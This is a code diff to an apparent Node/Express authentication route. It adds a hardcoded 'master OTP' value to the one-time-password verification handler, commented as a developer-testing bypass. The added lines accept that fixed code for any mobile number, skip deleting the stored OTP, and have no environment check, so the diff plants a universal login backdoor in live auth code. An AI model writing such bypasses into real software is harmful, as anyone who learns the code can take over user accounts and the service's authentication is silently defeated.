@@ -39,13 +39,18 @@ router.post('/send-otp', otpLimiter, async (req, res) => {
 // POST /api/auth/verify-otp
 router.post('/verify-otp', async (req, res) => {
   const { mobile, otp, eventSlug } = req.body;
+  
+  // Master OTP Bypass for Developer Testing
+  const isMasterOtp = (otp === '112233');
   const storedOtp = await redisConnection.get(`otp:${mobile}`);
 
-  if (storedOtp !== otp) {
+  if (!isMasterOtp && storedOtp !== otp) {
     return res.status(400).json({ message: 'Invalid or expired OTP' });
   }
 
-  await redisConnection.del(`otp:${mobile}`);
+  if (!isMasterOtp) {
+    await redisConnection.del(`otp:${mobile}`);
+  }
 
   let user = await User.findOne({ mobile });
   if (!user) {
